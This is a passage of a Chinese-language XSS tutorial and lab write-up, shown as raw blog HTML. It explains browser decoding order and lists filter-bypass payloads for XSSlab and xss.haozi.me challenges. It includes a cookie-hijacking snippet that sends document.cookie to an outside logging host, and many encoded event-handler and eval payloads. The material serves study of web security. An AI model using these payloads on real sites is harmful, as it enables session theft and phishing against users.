class=\"line\"></span><br><span class=\"line\">    &lt;!-- 可以解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;bbb&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 直接通过html解析 --&gt;</span><br><span class=\"line\">    &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;ccc&lt;/a&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 通过html解析为javascript，js在解析url编码 --&gt;</span><br><span class=\"line\">    &lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;!-- 先html解析，编码，再给js解析 --&gt;</span><br><span class=\"line\">    &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;</span><br><span class=\"line\">    &lt;!-- 编码alert，函数名可以解析 --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    在解析一篇HTML文档时主要有三个处理过程：HTML解析，URL解析和JavaScript解析</span><br><span class=\"line\">    一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&#x27;&lt;&#x27;符号&#x27;（后面没有跟&#x27;/&#x27;符号）&#x27;就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</span><br><span class=\"line\">    &lt;input value=&quot;xxx&quot;&gt;  由于没有&gt;,value中的内容无法进入数据状态解析</span><br><span class=\"line\">    &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;&lt;br&gt;  </span><br><span class=\"line\">    &lt;textarea&gt;由于有完整的&lt;&gt;，因此可以解析后面的内容，把&amp;#60解析为&lt;,但不会进入数据开始状态</span><br><span class=\"line\">    不能对协议类型进行任何的编码操作&#x27;</span><br><span class=\"line\">    Unicode转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：</p>\n<p>浏览器解析顺序：URL 解析器 -&gt;HTML 解析器 -&gt; CSS 解析器 -&gt;JS 解析器</p>\n<p>不能对协议进行编码 javascript:   (包含：)</p>\n<h3 id=\"html解析\"><a class=\"markdownIt-Anchor\" href=\"#html解析\">#</a> HTML 解析</h3>\n<p>一个 HTML 解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&lt;‘符号（后面没有跟’/' 符号）就会进入 <code>“标签开始状态(Tag open state)”</code> 。然后转变到 <code>“标签名状态(Tag name state)”</code> ， <code>“前属性名状态(before attribute name state)”</code> … 最后进入 <code>“数据状态(Data state)”</code>  并释放当前标签的 token。当解析器处于 “数据状态 (Data state)” 时，它会继续解析，每当发现一个完整的标签，就会释放出一个 token。</p>\n<p>在 HTML 中有五类元素：</p>\n<ol>\n<li>\n<p>空元素 (Void elements)，如<area>,<base>等等</p>\n</li>\n<li>\n<p>原始文本元素 (Raw text elements)，有<script>和<style></p>\n</li>\n<li>\n<p>RCDATA 元素 (RCDATA elements)，有<textarea>和<title></p>\n</li>\n<li>\n<p>外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素</p>\n</li>\n<li>\n<p>基本元素 (Normal elements)，即除了以上 4 种元素以外的元素</p>\n</li>\n</ol>\n<p>五类元素的区别如下：</p>\n<ol>\n<li>\n<p>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</p>\n</li>\n<li>\n<p>原始文本元素，可以容纳文本。</p>\n</li>\n<li>\n<p>RCDATA 元素，可以容纳文本和字符引用。</p>\n</li>\n<li>\n<p>外部元素，可以容纳文本、字符引用、CDATA 段、其他元素和注释</p>\n</li>\n<li>\n<p>基本元素，可以容纳文本、字符引用、其他元素和注释</p>\n</li>\n</ol>\n<p>如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在<textarea>和<title>标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如<textarea>或<title>的内容中），唯一能够被解析器认做是标签的就是 “</textarea>” 或者 “</title>”。因此，在 “<textarea>” 和 “<title>” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。</p>\n<h3 id=\"url解析\"><a class=\"markdownIt-Anchor\" href=\"#url解析\">#</a> URL 解析</h3>\n<p>首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， <code>你不能对协议类型进行任何的编码操作</code> ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。</p>\n<h3 id=\"javascript解析\"><a class=\"markdownIt-Anchor\" href=\"#javascript解析\">#</a> JavaScript 解析</h3>\n<p>那像 “\\uXXXX”（例如 \\u0000,\\u000A）这样的字符呢，JavaScript 会解析这些字符来执行吗？简单的说：视情况而定。具体的说就是要看被编码的序列到底是哪部分。首先，像 \\uXXXX 一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在 3 个部分：字符串中，标识符名称中和控制字符中。</p>\n<p>字符串中：当 Unicode 转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p>\n<p>标识符名称中：当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。这可以用来解释问题 10。如果我们深入研究 JavaScript 细则，可以看到如下内容：</p>\n<p>“Unicode 转义序列（如 \\u000A\\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’' 符号前置在 Unicode 转义序列串（如 \\u000A000B000C）并不能作为标识符名称中的字符。将 Unicode 转义序列串放在标识符名称中是非法的。”</p>\n<p>总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。如果我们回看问题 11，它并不会被执行。因为 “(11)” 不会被正确的解析，而 “alert (11)” 也不是一个有效的标识符名称。问题 12 不会被正确执行要么是因为’\\u0031\\u0032’不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。问题 13 不会执行的原因是’\\u0027’仅仅会被解释成单引号文本，而此时字符串是未闭合的。问题 14 能够执行的原因是’\\u000a’会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。</p>\n<p>即 () 和 里面的东西都不能编码</p>\n<h2 id=\"xss攻击方式\"><a class=\"markdownIt-Anchor\" href=\"#xss攻击方式\">#</a> XSS 攻击方式</h2>\n<h3 id=\"1读取浏览器cookie对象发起cookie劫持\"><a class=\"markdownIt-Anchor\" href=\"#1读取浏览器cookie对象发起cookie劫持\">#</a> 1. 读取浏览器 cookie 对象，发起 cookie 劫持</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var img = document.createElement(&quot;img&quot;);</span><br><span class=\"line\">img.src = &quot;http://www.eval.com/log?&quot; + escape(document.cookie);</span><br><span class=\"line\">document.body.append(img);</span><br></pre></td></tr></table></figure>\n<p>使用 httponly 标识可以防止 cookie 劫持</p>\n<h3 id=\"2模拟postget请求操作用户的浏览器\"><a class=\"markdownIt-Anchor\" href=\"#2模拟postget请求操作用户的浏览器\">#</a> 2. 模拟 POST，GET 请求操作用户的浏览器</h3>\n<p>在 cookie 劫持失效时或是在目标用户的网络不能访问互联网时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.抓包分析浏览器发送的请求</span><br><span class=\"line\">2.构造完整url，使用XMLHTTPRequest或者form表单请求此url</span><br></pre></td></tr></table></figure>\n<h3 id=\"3xss钓鱼\"><a class=\"markdownIt-Anchor\" href=\"#3xss钓鱼\">#</a> 3.XSS 钓鱼</h3>\n<p>通过伪造登录框获取用户的用户名和密码，在将密码和用户名发送到自己服务器上</p>\n<h3 id=\"4获取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#4获取用户信息\">#</a> 4. 获取用户信息</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.识别用户浏览器，根据每个浏览器特有的功能</span><br><span class=\"line\">2.识别用户安装的软件或浏览器插件</span><br><span class=\"line\">3.查询用户访问过的连接</span><br><span class=\"line\">4.获取用户真实IP</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"xsslab\"><a class=\"markdownIt-Anchor\" href=\"#xsslab\">#</a> XSSlab</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHl6MzE1L3AvMTQ4NTAzNTkuaHRtbA==\">https://www.cnblogs.com/xyz315/p/14850359.html</span></p>\n<p>Level - 1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.1.6:18888/xss/level1.php?name=test</span></span><br><span class=\"line\"></span><br><span class=\"line\">?name=&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">?name=&lt;input onclick/onmouseover&gt;</span><br><span class=\"line\">?name=&lt;a onclick/javascript&gt;</span><br><span class=\"line\">?name=&lt;img src&gt;</span><br><span class=\"line\">?name=&lt;iframe&gt;</span><br><span class=\"line\">?name=&lt;svg&gt;</span><br><span class=\"line\">?name=&lt;video onloadstart=<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>) src=<span class=\"string\">&quot;/media/hack-the-plant.mp4&quot;</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>闭合 大小写 双写 编码</p>\n<p>Level 10</p>\n<p>?keyword=111&amp;t_sort=1 type=“text” onclick=alert(1)</p>\n<p>?keyword=111&amp;t_sort=1 type=“text” onfocus=alert(1) autofocus=&quot;true</p>\n<p>Level 11</p>\n<p>Post 提交 referer</p>\n<h2 id=\"模板字符串\"><a class=\"markdownIt-Anchor\" href=\"#模板字符串\">#</a> 模板字符串</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//弹窗，因为有tostring方法，把数组中第一个参数转为字符串</span></span><br><span class=\"line\">alert<span class=\"string\">`a`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span>    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，因为有$&#123;&#125;执行表达式</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，相当于2前后加了个字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>b`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，因为没有tostring，会放在数组中输出</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，和上一条一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1)`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;alert(1)&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，和3一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1) <span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;alert(1) &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时不是模板字符串，是函数</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然有$&#123;&#125;执行表达式，但此时alert是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert(1)&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//上面都是先解析$&#123;&#125;，最后在解析eval</span></span><br><span class=\"line\"><span class=\"comment\">//对于call方法</span></span><br><span class=\"line\"><span class=\"comment\">//弹窗</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">&#x27;alert(1)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时相当于eval(&#x27;alert(1)&#x27;),call相当于将eval内的执行</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>.<span class=\"property\">call</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 </span></span><br><span class=\"line\"><span class=\"string\">`aaa <span class=\"subst\">$&#123;alert<span class=\"string\">`1`</span>&#125;</span> bbbb`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;aaa undefined bbbb&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//报错，不能对符号编码，因此的prompt不是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;prompt\\x281\\x29&#125;</span>`</span></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>aaa$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;bbb<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//不弹</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//返回[&quot;aaaaaaaaa&quot;]</span></span><br><span class=\"line\"><span class=\"string\">eval([&quot;aaaaaaaaa&quot;]);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval只能接收第一个参数的值，他只有一个参数</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//`</span><span class=\"string\">`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&#x27;prompt(1)&#x27;,但eval不接</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入11111,打印11111.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入aaaa,打印aaaa undefined.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">Uncaught ReferenceError: aaaa is not defined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br></pre></td></tr></table></figure>\n<p>模板字符串中需要有表达式 ${} 才能执行 eval``</p>\n<p>eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回</p>\n<p>alert 有 tostring 方法，将数字专为字符串执行</p>\n<p>eval 没有 tostring，将数字放入数组中</p>\n<p>模板字符串可以解析 16 进制和 Unicode</p>\n<p>call 用来改变 this 指向</p>\n<h2 id=\"httpsxsshaozime\"><a class=\"markdownIt-Anchor\" href=\"#httpsxsshaozime\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuaGFvemkubWUv\">https://xss.haozi.me/</span></h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDA3NzU0NC9hcnRpY2xlL2RldGFpbHMvOTUwOTQ3NTk=\">https://blog.csdn.net/weixin_44077544/article/details/95094759</span></p>\n<p>0x03</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert&amp;#40;1&amp;#41;&quot;&gt;aaa</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;alert`1`&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>0x05</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;--!</span><br></pre></td></tr></table></figure>\n<p>0x06</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onclick</span><br><span class=\"line\">=alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">type=&quot;image&quot; src=1 onerror=</span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x07</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;//</span><br></pre></td></tr></table></figure>\n<p>0x08</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;/style</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x09</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=https://www/segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x0A</p>\n<p>只有 Firefox 可以进行跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.segmentfault.com@xss.haozi.com/j.js</span><br></pre></td></tr></table></figure>\n<p>http/https @ 会匹配后面一个并进行重定向</p>\n<p>ftp @前是用户名，后是 password</p>\n<p>0x0B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span 